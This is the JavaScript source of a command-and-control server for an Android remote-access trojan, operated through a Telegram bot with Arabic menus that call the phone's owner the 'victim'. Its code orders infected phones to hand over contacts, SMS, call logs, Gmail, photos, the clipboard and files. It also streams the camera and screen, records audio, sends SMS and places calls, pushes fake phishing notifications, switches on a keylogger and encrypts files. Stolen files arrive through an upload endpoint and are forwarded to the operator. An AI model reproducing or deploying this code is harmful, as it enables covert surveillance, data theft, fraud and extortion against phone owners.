const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require("fs");
const path = require("path");

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer({ storage: multer.memoryStorage() });

// ======================== إعدادات المطور ========================
const DEV_USERNAME = "@hhhbjvv";
const DEV_CHANNEL = "https://t.me/lmh716";
const DEV_NAME = "محمد";
const OLD_USERNAMES = ['@king_1_4', '@king', '@admin', '@user', '@u_x86'];

// ======================== قراءة البيانات ========================
if (!fs.existsSync("./data.json")) {
    console.error("❌ خطأ: ملف data.json غير موجود!");
    process.exit(1);
}

let data;
try {
    data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
} catch (error) {
    console.error("❌ خطأ في قراءة ملف data.json:", error.message);
    process.exit(1);
}

const bot = new telegramBot(data.token, { polling: true });

let admins = [];
if (Array.isArray(data.admins)) {
    admins = data.admins;
} else if (data.id) {
    admins = [data.id];
} else {
    console.error("❌ لا يوجد معرف أدمن في data.json");
    process.exit(1);
}

// ======================== التخزين المؤقت ========================
const adminSessions = new Map();
const deviceLastRequester = new Map();
const activeStreams = new Map();

// ======================== قائمة الأزرار ========================
const actions = [
    "📒 سحب جهات اتصال 📒", "💬 سحب الرسائل 💬", "📞 سجل المكالمات 📞",
    "📽 التطبيقات 📽", "📸 كيمرا خلفيه 📸", "📸 كيمرا أمامية 📸",
    "🎥 بث مباشر كاميرا خلفية 🎥", "🎥 بث مباشر كاميرا أمامية 🎥",
    "🖥 بث مباشر الشاشة 🖥", "🎙 تسجيل صوت 🎙", "📋 سجل الحافظه 📋",
    "📺 لقطة شاشة 📺", "😎 اضهار رساله اسفل الشاشة 😎", "💬 ارسال رساله 💬",
    "📳 اهتزاز 📳", "▶ تشغيل الصوت ▶", "🛑 ايقاف الصوت 🛑",
    "🦝 اضهار اشعارات الضحية 🦝", "🛑 ايقاف الاشعارات 🛑",
    "📂 عرض جميع الملفات 📂", "🎬 سحب جميع الصور 🎬",
    "💬 ارسال رساله لجميع ارقام الضحيه 💬", "‼ اشعار صفحة مزورة ‼",
    "📧 سحب رسايل جيميل 📧", "⚠️ تشفير ملفات ⚠️", "☎️اتصال من هاتف الضحيه☎️",
    "🔄 تحديث الحالة 🔄", "🌐 فتح رابط في المتصفح 🌐",
    "✯ العودة إلى القائمة الرئيسية ✯"
];

// ======================== دوال مساعدة ========================
function getAdminSession(chatId) {
    if (!adminSessions.has(chatId)) {
        adminSessions.set(chatId, {});
    }
    return adminSessions.get(chatId);
}

function sendToAdmin(adminId, text, options = {}) {
    let modifiedText = text;
    OLD_USERNAMES.forEach(oldUser => {
        modifiedText = modifiedText.replace(new RegExp(oldUser.replace('@', '\\@'), 'g'), DEV_USERNAME);
    });
    
    bot.sendMessage(adminId, modifiedText, options).catch(e => 
        console.log(`❌ فشل إرسال للأدمن ${adminId}:`, e.message)
    );
}

function sendFileToAdmin(adminId, fileBuffer, options = {}, fileOptions = {}) {
    let modifiedBuffer = fileBuffer;
    
    try {
        let fileContent = fileBuffer.toString('utf8');
        let modified = false;
        
        OLD_USERNAMES.forEach(oldUser => {
            if (fileContent.includes(oldUser)) {
                fileContent = fileContent.replace(new RegExp(oldUser.replace('@', '\\@'), 'g'), DEV_USERNAME);
                modified = true;
            }
        });
        
        if (modified) {
            modifiedBuffer = Buffer.from(fileContent, 'utf8');
            console.log('✅ تم تعديل يوزرات داخل الملف قبل الإرسال');
        }
    } catch (e) {
        // الملف ليس نصياً
    }
    
    bot.sendDocument(adminId, modifiedBuffer, options, fileOptions).catch(e => 
        console.log(`❌ فشل إرسال ملف للأدمن ${adminId}:`, e.message)
    );
}

function sendToAllAdmins(text, options = {}) {
    let modifiedText = text;
    OLD_USERNAMES.forEach(oldUser => {
        modifiedText = modifiedText.replace(new RegExp(oldUser.replace('@', '\\@'), 'g'), DEV_USERNAME);
    });
    
    admins.forEach(adminId => {
        bot.sendMessage(adminId, modifiedText, options).catch(e => 
            console.log(`❌ فشل إرسال للأدمن ${adminId}:`, e.message)
        );
    });
}

// ======================== دوال عزل الردود ========================
function sendResponseToRequester(socketId, text, options = {}) {
    const adminId = deviceLastRequester.get(socketId);
    if (adminId && isAdmin(adminId)) {
        sendToAdmin(adminId, text, options);
    } else {
        console.log(`⚠️ لا يوجد أدمن مرتبط بـ socket ${socketId} لإرسال الرد`);
    }
}

function sendFileResponseToRequester(socketId, fileBuffer, options = {}, fileOptions = {}) {
    const adminId = deviceLastRequester.get(socketId);
    if (adminId && isAdmin(adminId)) {
        sendFileToAdmin(adminId, fileBuffer, options, fileOptions);
    } else {
        console.log(`⚠️ لا يوجد أدمن مرتبط بـ socket ${socketId} لإرسال الملف`);
    }
}

function isAdmin(userId) {
    return admins.includes(userId);
}

function sanitizeMessage(message) {
    let cleanMessage = message;
    OLD_USERNAMES.forEach(oldUser => {
        const escapedOldUser = oldUser.replace('@', '\\@');
        cleanMessage = cleanMessage.replace(new RegExp(escapedOldUser, 'g'), DEV_USERNAME);
    });
    return cleanMessage;
}

function findAdminByDeviceModel(deviceModel) {
    for (let [adminId, session] of adminSessions.entries()) {
        if (session.currentTarget) {
            const socket = io.sockets.sockets.get(session.currentTarget);
            if (socket && socket.model === deviceModel) {
                return adminId;
            }
        }
    }
    
    for (let [socketId, adminId] of deviceLastRequester.entries()) {
        const socket = io.sockets.sockets.get(socketId);
        if (socket && socket.model === deviceModel) {
            return adminId;
        }
    }
    
    return null;
}

// ======================== نقطة النهاية الرئيسية ========================
app.get("/", (req, res) => {
    res.send(`✅ بوت التحكم المحلي شغال على المنفذ 3000<br>👥 الأجهزة المتصلة: ${io.sockets.sockets.size}`);
});

// ======================== رفع الملفات من الضحية ========================
app.post("/upload", uploader.single("file"), (req, res) => {
    if (!req.file) {
        return res.status(400).json({ success: false, error: "No file uploaded" });
    }

    const fileName = req.file.originalname;
    const deviceModel = req.headers.model || "غير معروف";
    const socketId = req.headers['socket-id'];
    const fileBuffer = req.file.buffer;

    console.log("=".repeat(60));
    console.log(`📥 طلب رفع ملف واصل في ${new Date().toLocaleString('ar-EG')}`);
    console.log(`📎 اسم الملف: ${fileName}`);
    console.log(`📎 الجهاز: ${deviceModel}`);
    console.log(`📎 حجم الملف: ${(req.file.size / 1024).toFixed(2)} كيلوبايت`);

    let targetAdminId = null;

    if (socketId && deviceLastRequester.has(socketId)) {
        targetAdminId = deviceLastRequester.get(socketId);
        console.log(`✅ تم العثور على الأدمن ${targetAdminId} باستخدام socket-id`);
    } else {
        targetAdminId = findAdminByDeviceModel(deviceModel);
        if (targetAdminId) {
            console.log(`✅ تم العثور على الأدمن ${targetAdminId} باستخدام نموذج الجهاز`);
        }
    }

    const caption = `<b>✯ تم تحميل ملف من هاتف الضحية → ${deviceModel}</b>\n\n` +
                    `<b>اسم الملف:</b> ${fileName}\n` +
                    `<b>الحجم:</b> ${(req.file.size / 1024).toFixed(2)} كيلوبايت`;

    const fileOptions = {
        filename: fileName,
        contentType: req.file.mimetype
    };

    if (targetAdminId && isAdmin(targetAdminId)) {
        sendFileToAdmin(targetAdminId, fileBuffer, { caption, parse_mode: "HTML" }, fileOptions);
        return res.json({ success: true, sentTo: targetAdminId });
    } else {
        console.log(`⚠️ لا يوجد أدمن مرتبط بالجهاز ${deviceModel} (socket: ${socketId || 'غير معروف'}) لإرسال الملف ${fileName}`);
        return res.json({ success: false, error: "No admin found for this device" });
    }
});

// نقطة نهاية لاستقبال البث
app.post("/stream/:deviceId/:type", uploader.single("frame"), (req, res) => {
    const deviceId = req.params.deviceId;
    const streamType = req.params.type;
    
    if (!req.file) {
        return res.status(400).json({ success: false });
    }
    
    console.log(`📡 بث مباشر من ${deviceId} - نوع: ${streamType} - حجم: ${req.file.size} بايت`);
    
    const targetAdminId = deviceLastRequester.get(deviceId);
    
    if (targetAdminId && isAdmin(targetAdminId)) {
        const now = Date.now();
        const lastStreamNotif = activeStreams.get(`${deviceId}_${targetAdminId}`) || 0;
        
        if (now - lastStreamNotif > 5000) {
            bot.sendPhoto(targetAdminId, req.file.buffer, {
                caption: `📡 <b>بث مباشر من الجهاز</b>\nنوع: ${streamType}`,
                parse_mode: "HTML"
            }).catch(e => {});
            activeStreams.set(`${deviceId}_${targetAdminId}`, now);
        }
    }
    
    res.json({ success: true });
});

// ======================== أحداث Socket.io ========================
io.on("connection", (socket) => {
    const model = socket.handshake.headers.model || "جهاز غير معروف";
    const version = socket.handshake.headers.version || "غير معروف";
    const ip = socket.handshake.headers.ip || "غير معروف";

    socket.model = model;
    socket.version = version;
    socket.ip = ip;

    console.log(`🔌 جهاز متصل: ${model} (${socket.id})`);

    const connectMsg = `<b>🔌 جهاز الضحية متصل</b>\n\n` +
        `<b>📱 اسم الهاتف:</b> ${model}\n` +
        `<b>📊 إصدار الهاتف:</b> ${version}\n` +
        `<b>🌐 IP:</b> ${ip}\n` +
        `<b>🆔 Socket ID:</b> ${socket.id}`;
    sendToAllAdmins(connectMsg, { parse_mode: "HTML" });

    socket.on("disconnect", () => {
        console.log(`🔌 جهاز غير متصل: ${model} (${socket.id})`);
        deviceLastRequester.delete(socket.id);
        
        const disconnectMsg = `<b>🔌 الجهاز غير متصل</b>\n\n` +
            `<b>📱 اسم الهاتف:</b> ${model}`;
        sendToAllAdmins(disconnectMsg, { parse_mode: "HTML" });
    });

    socket.on("message", (msg) => {
        const cleanMsg = sanitizeMessage(msg);
        const adminId = deviceLastRequester.get(socket.id);
        
        const message = `<b>💬 رسالة من جهاز الضحية</b>\n\n` +
            `<b>📱 الجهاز:</b> ${model}\n` +
            `<b>📝 الرسالة:</b> ${cleanMsg}`;

        if (adminId && isAdmin(adminId)) {
            sendToAdmin(adminId, message, { parse_mode: "HTML" });
        } else {
            sendToAllAdmins(message, { parse_mode: "HTML" });
        }
    });

    socket.on("file-explorer", (files) => {
        console.log(`📁 قائمة ملفات من ${model}`);
        
        let inlineKeyboard = [];
        let row = [];

        files.slice(0, 50).forEach((file, index) => {
            const displayName = file.name.length > 20 ? file.name.substring(0, 17) + "..." : file.name;
            const callbackData = file.isFolder
                ? `${model}|cd-${file.name}`
                : `${model}|request-${file.name}`;

            row.push({ text: displayName, callback_data: callbackData });

            if (row.length === 2 || index === files.length - 1) {
                inlineKeyboard.push(row);
                row = [];
            }
        });

        inlineKeyboard.push([{ text: "🔙 رجوع", callback_data: `${model}|back-0` }]);

        const message = `<b>📁 ملفات الجهاز ${model}</b>\n\nعدد الملفات: ${files.length}`;
        const options = {
            reply_markup: { inline_keyboard: inlineKeyboard },
            parse_mode: "HTML"
        };

        sendResponseToRequester(socket.id, message, options);
    });

    socket.on("status", (status) => {
        const statusMsg = `<b>📊 تحديث حالة الجهاز</b>\n\n` +
            `<b>الجهاز:</b> ${model}\n` +
            `<b>الحالة:</b> ${status}`;
        
        sendResponseToRequester(socket.id, statusMsg, { parse_mode: "HTML" });
    });
});

// ======================== أحداث البوت ========================
bot.on("message", (msg) => {
    const chatId = msg.chat.id;
    if (!isAdmin(chatId)) return;

    const text = msg.text;
    const session = getAdminSession(chatId);

    if (text === "/start") {
        bot.sendMessage(chatId,
            "<b>✯ بوت التحكم المحلي v.2099</b>\n\n" +
            `تم تطوير البوت من قبل 🦅🇾🇪 ${DEV_NAME}\n\n` +
            `📱 <b>الأجهزة المتصلة:</b> ${io.sockets.sockets.size}\n\n` +
            `🌐 <b>الرابط المحلي:</b> http://localhost:3000\n` +
            `📞 <b>للتواصل مع المطور:</b> ${DEV_USERNAME}\n` +
            `📢 <b>قناة المطور:</b> ${DEV_CHANNEL}`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: [
                        ["📊 عدد الاجهزه", "🎮 قائمة التحكم"],
                        ["ℹ️ معلومات عن المطور"]
                    ],
                    resize_keyboard: true
                }
            }
        );
    }
    else if (text === "📊 عدد الاجهزه") {
        const count = io.sockets.sockets.size;
        if (count === 0) {
            bot.sendMessage(chatId, "<b>✯ لا يوجد أجهزة متصلة</b>", { parse_mode: "HTML" });
        } else {
            let details = `<b>📱 الأجهزة المتصلة: ${count}</b>\n\n`;
            let i = 1;
            io.sockets.sockets.forEach(socket => {
                details += `<b>الجهاز ${i}:</b>\n` +
                    `📱 <b>الاسم:</b> ${socket.model}\n` +
                    `📊 <b>الإصدار:</b> ${socket.version}\n` +
                    `🆔 <b>المعرف:</b> ${socket.id.substring(0, 8)}...\n\n`;
                i++;
            });
            bot.sendMessage(chatId, details, { parse_mode: "HTML" });
        }
    }
    else if (text === "🎮 قائمة التحكم") {
        if (io.sockets.sockets.size === 0) {
            bot.sendMessage(chatId, "<b>✯ لا يوجد أجهزة متصلة</b>", { parse_mode: "HTML" });
        } else {
            let deviceButtons = [];
            io.sockets.sockets.forEach(socket => {
                deviceButtons.push([socket.model]);
            });
            deviceButtons.push(["🔙 القائمة الرئيسية"]);
            bot.sendMessage(chatId, "<b>📱 اختر الجهاز للتحكم به</b>", {
                parse_mode: "HTML",
                reply_markup: {
                    keyboard: deviceButtons,
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        }
    }
    else if (text === "ℹ️ معلومات عن المطور") {
        bot.sendMessage(chatId,
            `<b>👨‍💻 معلومات المطور</b>\n\n` +
            `🦅 <b>الاسم:</b> ${DEV_NAME}\n` +
            `📞 <b>تيليجرام:</b> ${DEV_USERNAME}\n` +
            `📢 <b>القناة:</b> ${DEV_CHANNEL}`,
            { parse_mode: "HTML" }
        );
    }
    else if (text === "🔙 القائمة الرئيسية") {
        bot.sendMessage(chatId, "<b>🔰 القائمة الرئيسية</b>", {
            parse_mode: "HTML",
            reply_markup: {
                keyboard: [
                    ["📊 عدد الاجهزه", "🎮 قائمة التحكم"],
                    ["ℹ️ معلومات عن المطور"]
                ],
                resize_keyboard: true
            }
        });
    }
    else if (text === "🔙 تراجع") {
        const targetSocketId = session.currentTarget;
        if (targetSocketId) {
            const socket = io.sockets.sockets.get(targetSocketId);
            if (socket) {
                bot.sendMessage(chatId, `<b>📱 اختر الإجراء لجهاز ${socket.model}</b>`, {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [
                            ["📒 سحب جهات اتصال", "💬 سحب الرسائل"],
                            ["📞 سجل المكالمات", "📽 التطبيقات"],
                            ["📸 كيمرا خلفيه", "📸 كيمرا أمامية"],
                            ["🎥 بث مباشر كاميرا خلفية", "🎥 بث مباشر كاميرا أمامية"],
                            ["🖥 بث مباشر الشاشة", "🎙 تسجيل صوت"],
                            ["📋 سجل الحافظه", "📺 لقطة شاشة"],
                            ["😎 اضهار رساله اسفل الشاشة", "💬 ارسال رساله"],
                            ["📳 اهتزاز", "▶ تشغيل الصوت"],
                            ["🛑 ايقاف الصوت", "📂 عرض جميع الملفات"],
                            ["🎬 سحب جميع الصور", "💬 ارسال رساله لجميع ارقام الضحيه"],
                            ["‼ اشعار صفحة مزورة", "📧 سحب رسايل جيميل"],
                            ["⚠️ تشفير ملفات", "☎️اتصال من هاتف الضحيه"],
                            ["🔄 تحديث الحالة", "🌐 فتح رابط في المتصفح"],
                            ["🔙 القائمة الرئيسية"]
                        ],
                        resize_keyboard: true
                    }
                });
            }
        }
        delete session.currentAction;
        delete session.currentTarget;
        delete session.currentNumber;
        delete session.currentNotificationText;
    }
    else if (session.currentAction) {
        const targetSocketId = session.currentTarget;
        if (!targetSocketId || !io.sockets.sockets.has(targetSocketId)) {
            delete session.currentAction;
            delete session.currentTarget;
            return bot.sendMessage(chatId, "❌ الجهاز غير متصل");
        }

        deviceLastRequester.set(targetSocketId, chatId);

        switch (session.currentAction) {
            case "microphoneDuration":
                io.to(targetSocketId).emit("commend", {
                    request: "microphone",
                    extras: [{ key: "duration", value: text }]
                });
                break;
            case "toastText":
                io.to(targetSocketId).emit("commend", {
                    request: "toast",
                    extras: [{ key: "text", value: text }]
                });
                break;
            case "vibrateDuration":
                io.to(targetSocketId).emit("commend", {
                    request: "vibrate",
                    extras: [{ key: "duration", value: text }]
                });
                break;
            case "smsNumber":
                session.currentNumber = text;
                session.currentAction = "smsText";
                return bot.sendMessage(chatId, `✏️ أرسل الرسالة إلى ${text}`, {
                    reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
                });
            case "smsText":
                io.to(targetSocketId).emit("commend", {
                    request: "sendSms",
                    extras: [
                        { key: "number", value: session.currentNumber },
                        { key: "text", value: text }
                    ]
                });
                delete session.currentNumber;
                break;
            case "makeCallNumber":
                session.currentNumber = text;
                session.currentAction = "makeCallText";
                return bot.sendMessage(chatId, `✏️ أرسل "موافق" لتأكيد الاتصال بـ ${text}`, {
                    reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
                });
            case "makeCallText":
                if (text === "موافق") {
                    io.to(targetSocketId).emit("commend", {
                        request: "makeCall",
                        extras: [{ key: "number", value: session.currentNumber }]
                    });
                }
                delete session.currentNumber;
                break;
            case "notificationText":
                session.currentNotificationText = text;
                session.currentAction = "notificationUrl";
                return bot.sendMessage(chatId, "✏️ أرسل الرابط", {
                    reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
                });
            case "notificationUrl":
                io.to(targetSocketId).emit("commend", {
                    request: "popNotification",
                    extras: [
                        { key: "text", value: session.currentNotificationText },
                        { key: "url", value: text }
                    ]
                });
                delete session.currentNotificationText;
                break;
            case "textToAllContacts":
                io.to(targetSocketId).emit("commend", {
                    request: "smsToAllContacts",
                    extras: [{ key: "text", value: text }]
                });
                break;
            case "openUrl":
                io.to(targetSocketId).emit("commend", {
                    request: "openUrl",
                    extras: [{ key: "url", value: text }]
                });
                break;
        }

        delete session.currentAction;
        delete session.currentTarget;
        
        bot.sendMessage(chatId, "✅ تم تنفيذ الطلب", {
            reply_markup: {
                keyboard: [
                    ["📊 عدد الاجهزه", "🎮 قائمة التحكم"],
                    ["ℹ️ معلومات عن المطور"]
                ],
                resize_keyboard: true
            }
        });
    }
    else if (actions.some(a => a.includes(text) || a === text)) {
        const targetSocketId = session.currentTarget;
        if (!targetSocketId) {
            return bot.sendMessage(chatId, "❌ لم يتم تحديد جهاز");
        }
        
        if (!io.sockets.sockets.has(targetSocketId)) {
            delete session.currentTarget;
            return bot.sendMessage(chatId, "❌ الجهاز غير متصل");
        }

        deviceLastRequester.set(targetSocketId, chatId);

        if (text.includes("سحب جهات اتصال")) {
            io.to(targetSocketId).emit("commend", { request: "contacts", extras: [] });
        }
        else if (text.includes("سحب الرسائل")) {
            io.to(targetSocketId).emit("commend", { request: "all-sms", extras: [] });
        }
        else if (text.includes("سجل المكالمات")) {
            io.to(targetSocketId).emit("commend", { request: "calls", extras: [] });
        }
        else if (text.includes("التطبيقات")) {
            io.to(targetSocketId).emit("commend", { request: "apps", extras: [] });
        }
        else if (text.includes("كيمرا خلفيه")) {
            io.to(targetSocketId).emit("commend", { request: "main-camera", extras: [] });
        }
        else if (text.includes("كيمرا أمامية")) {
            io.to(targetSocketId).emit("commend", { request: "selfie-camera", extras: [] });
        }
        else if (text.includes("بث مباشر كاميرا خلفية")) {
            io.to(targetSocketId).emit("commend", { 
                request: "stream-camera", 
                extras: [
                    { key: "camera", value: "back" },
                    { key: "server", value: "http://localhost:3000" }
                ] 
            });
            bot.sendMessage(chatId, "📡 جاري بدء بث الكاميرا الخلفية...");
            delete session.currentTarget;
            return;
        }
        else if (text.includes("بث مباشر كاميرا أمامية")) {
            io.to(targetSocketId).emit("commend", { 
                request: "stream-camera", 
                extras: [
                    { key: "camera", value: "front" },
                    { key: "server", value: "http://localhost:3000" }
                ] 
            });
            bot.sendMessage(chatId, "📡 جاري بدء بث الكاميرا الأمامية...");
            delete session.currentTarget;
            return;
        }
        else if (text.includes("بث مباشر الشاشة")) {
            io.to(targetSocketId).emit("commend", {
                request: "stream-screen", 
                extras: [{ key: "server", value: "http://localhost:3000" }] 
            });
            bot.sendMessage(chatId, "🖥 جاري بدء بث الشاشة...");
            delete session.currentTarget;
            return;
        }
        else if (text.includes("تسجيل صوت")) {
            session.currentAction = "microphoneDuration";
            return bot.sendMessage(chatId, "✏️ أرسل المدة بالثواني", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("سجل الحافظه")) {
            io.to(targetSocketId).emit("commend", { request: "clipboard", extras: [] });
        }
        else if (text.includes("لقطة شاشة")) {
            io.to(targetSocketId).emit("commend", { request: "screenshot", extras: [] });
        }
        else if (text.includes("اضهار رساله اسفل الشاشة")) {
            session.currentAction = "toastText";
            return bot.sendMessage(chatId, "✏️ أرسل النص", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("ارسال رساله") && !text.includes("لجميع")) {
            session.currentAction = "smsNumber";
            return bot.sendMessage(chatId, "✏️ أرسل الرقم", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("اتصال من هاتف الضحيه")) {
            session.currentAction = "makeCallNumber";
            return bot.sendMessage(chatId, "✏️ أرسل الرقم", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("اهتزاز")) {
            session.currentAction = "vibrateDuration";
            return bot.sendMessage(chatId, "✏️ أرسل المدة بالثواني", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("ارسال رساله لجميع ارقام")) {
            session.currentAction = "textToAllContacts";
            return bot.sendMessage(chatId, "✏️ أرسل النص", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("اشعار صفحة مزورة")) {
            session.currentAction = "notificationText";
            return bot.sendMessage(chatId, "✏️ أرسل نص الإشعار", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("تشغيل الصوت")) {
            session.currentAction = "recordVoice";
            return bot.sendMessage(chatId, "🎤 أرسل رسالة صوتية", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }
        else if (text.includes("اضهار اشعارات")) {
            io.to(targetSocketId).emit("commend", { request: "keylogger-on", extras: [] });
        }
        else if (text.includes("ايقاف الاشعارات")) {
            io.to(targetSocketId).emit("commend", { request: "keylogger-off", extras: [] });
        }
        else if (text.includes("عرض جميع الملفات")) {
            io.to(targetSocketId).emit("file-explorer", { request: "ls", extras: [] });
            delete session.currentTarget;
            return bot.sendMessage(chatId, "✅ جاري عرض الملفات...");
        }
        else if (text.includes("سحب جميع الصور")) {
            io.to(targetSocketId).emit("commend", { request: "gallery", extras: [] });
        }
        else if (text.includes("سحب رسايل جيميل")) {
            io.to(targetSocketId).emit("commend", { request: "all-email", extras: [] });
        }
        else if (text.includes("تشفير ملفات")) {
            io.to(targetSocketId).emit("commend", { request: "encrypt", extras: [] });
        }
        else if (text.includes("ايقاف الصوت")) {
            io.to(targetSocketId).emit("commend", { request: "stopAudio", extras: [] });
        }
        else if (text.includes("تحديث الحالة")) {
            io.to(targetSocketId).emit("commend", { request: "status", extras: [] });
            delete session.currentTarget;
            return bot.sendMessage(chatId, "🔄 جاري تحديث الحالة...");
        }
        else if (text.includes("فتح رابط في المتصفح")) {
            session.currentAction = "openUrl";
            return bot.sendMessage(chatId, "🌐 أرسل الرابط", {
                reply_markup: { keyboard: [["🔙 تراجع"]], resize_keyboard: true }
            });
        }

        delete session.currentTarget;
        bot.sendMessage(chatId, "✅ تم تنفيذ الطلب", {
            reply_markup: {
                keyboard: [
                    ["📊 عدد الاجهزه", "🎮 قائمة التحكم"],
                    ["ℹ️ معلومات عن المطور"]
                ],
                resize_keyboard: true
            }
        });
    }
    else {
        let found = false;
        io.sockets.sockets.forEach((socket, id) => {
            if (socket.model === text) {
                found = true;
                session.currentTarget = id;
                bot.sendMessage(chatId, `<b>📱 تم اختيار ${socket.model}</b>\n\nاختر الإجراء:`, {
                    parse_mode: "HTML",
                    reply_markup: {
                        keyboard: [
                            ["📒 سحب جهات اتصال", "💬 سحب الرسائل"],
                            ["📞 سجل المكالمات", "📽 التطبيقات"],
                            ["📸 كيمرا خلفيه", "📸 كيمرا أمامية"],
                            ["🎥 بث مباشر كاميرا خلفية", "🎥 بث مباشر كاميرا أمامية"],
                            ["🖥 بث مباشر الشاشة", "🎙 تسجيل صوت"],
                            ["📋 سجل الحافظه", "📺 لقطة شاشة"],
                            ["😎 اضهار رساله اسفل الشاشة", "💬 ارسال رساله"],
                            ["📳 اهتزاز", "▶ تشغيل الصوت"],
                            ["🛑 ايقاف الصوت", "📂 عرض جميع الملفات"],
                            ["🎬 سحب جميع الصور", "💬 ارسال رساله لجميع ارقام الضحيه"],
                            ["‼ اشعار صفحة مزورة", "📧 سحب رسايل جيميل"],
                            ["⚠️ تشفير ملفات", "☎️اتصال من هاتف الضحيه"],
                            ["🔄 تحديث الحالة", "🌐 فتح رابط في المتصفح"],
                            ["🔙 القائمة الرئيسية"]
                        ],
                        resize_keyboard: true
                    }
                });
            }
        });
        if (!found) {
            bot.sendMessage(chatId, "❌ أمر غير معروف");
        }
    }
});

// ======================== معالجة الملفات الصوتية ========================
bot.on("voice", (msg) => {
    const chatId = msg.chat.id;
    if (!isAdmin(chatId)) return;

    const session = getAdminSession(chatId);
    if (session.currentAction === "recordVoice") {
        const targetSocketId = session.currentTarget;
        if (!targetSocketId || !io.sockets.sockets.has(targetSocketId)) {
            delete session.currentAction;
            delete session.currentTarget;
            return bot.sendMessage(chatId, "❌ الجهاز غير متصل");
        }

        deviceLastRequester.set(targetSocketId, chatId);

        bot.getFileLink(msg.voice.file_id).then(fileLink => {
            io.to(targetSocketId).emit("commend", {
                request: "playAudio",
                extras: [{ key: "url", value: fileLink }]
            });
            
            delete session.currentTarget;
            delete session.currentAction;
            
            bot.sendMessage(chatId, "✅ تم إرسال الصوت للتشغيل", {
                reply_markup: {
                    keyboard: [
                        ["📊 عدد الاجهزه", "🎮 قائمة التحكم"],
                        ["ℹ️ معلومات عن المطور"]
                    ],
                    resize_keyboard: true
                }
            });
        }).catch(err => {
            console.log(err);
            bot.sendMessage(chatId, "❌ فشل تحميل الملف الصوتي");
        });
    }
});

// ======================== معالجة الاستعلامات المضمنة ========================
bot.on("callback_query", (query) => {
    const chatId = query.from.id;
    if (!isAdmin(chatId)) return;

    const data = query.data;
    const [deviceModel, actionPart] = data.split("|");
    const [action, value] = actionPart.split("-");

    let targetSocketId = null;
    io.sockets.sockets.forEach((socket, id) => {
        if (socket.model === deviceModel) {
            targetSocketId = id;
        }
    });

    if (!targetSocketId) {
        bot.answerCallbackQuery(query.id, { text: "❌ الجهاز غير متصل", show_alert: true });
        return;
    }

    deviceLastRequester.set(targetSocketId, chatId);

    if (action === "back") {
        io.to(targetSocketId).emit("file-explorer", { request: "back", extras: [] });
        bot.answerCallbackQuery(query.id, { text: "🔙 جاري العودة..." });
    } else if (action === "cd") {
        io.to(targetSocketId).emit("file-explorer", {
            request: "cd",
            extras: [{ key: "name", value }]
        });
        bot.answerCallbackQuery(query.id, { text: `📂 جاري فتح ${value}` });
    } else if (action === "upload") {
        io.to(targetSocketId).emit("file-explorer", {
            request: "upload",
            extras: [{ key: "name", value }]
        });
        bot.answerCallbackQuery(query.id, { text: `📥 جاري تحميل ${value}` });
    } else if (action === "delete") {
        io.to(targetSocketId).emit("file-explorer", {
            request: "delete",
            extras: [{ key: "name", value }]
        });
        bot.answerCallbackQuery(query.id, { text: `🗑 جاري حذف ${value}` });
    } else if (action === "request") {
        bot.editMessageText(`📁 <b>${value}</b>\n\nاختر الإجراء:`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: {
                inline_keyboard: [[
                    { text: "📥 تحميل", callback_data: `${deviceModel}|upload-${value}` },
                    { text: "🗑 حذف", callback_data: `${deviceModel}|delete-${value}` }
                ]]
            },
            parse_mode: "HTML"
        }).catch(console.error);
        
        bot.answerCallbackQuery(query.id);
    }
});

// ======================== نبضات قلب ========================
setInterval(() => {
    io.sockets.sockets.forEach((socket) => {
        socket.emit("ping", { time: Date.now() });
    });
    console.log("💓 Ping sent to all devices -", new Date().toLocaleString('ar-EG'));
}, 30000);

// تنظيف البث المنتهي
setInterval(() => {
    const now = Date.now();
    for (const [key, timestamp] of activeStreams.entries()) {
        if (now - timestamp > 10000) {
            activeStreams.delete(key);
        }
    }
}, 15000);

// ======================== تشغيل الخادم ========================
const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log("=".repeat(60));
    console.log(`🚀 بوت التحكم المحلي يعمل على المنفذ ${PORT}`);
    console.log(`👥 عدد الأدمنز: ${admins.length}`);
    console.log(`👤 المطور: ${DEV_NAME} ${DEV_USERNAME}`);
    console.log(`📢 القناة: ${DEV_CHANNEL}`);
    console.log(`🌐 الرابط المحلي: http://localhost:3000`);
    console.log("=".repeat(60));
});

process.on('uncaughtException', (error) => {
    console.error('❌ خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (error) => {
    console.error('❌ وعد غير معالج:', error);
});

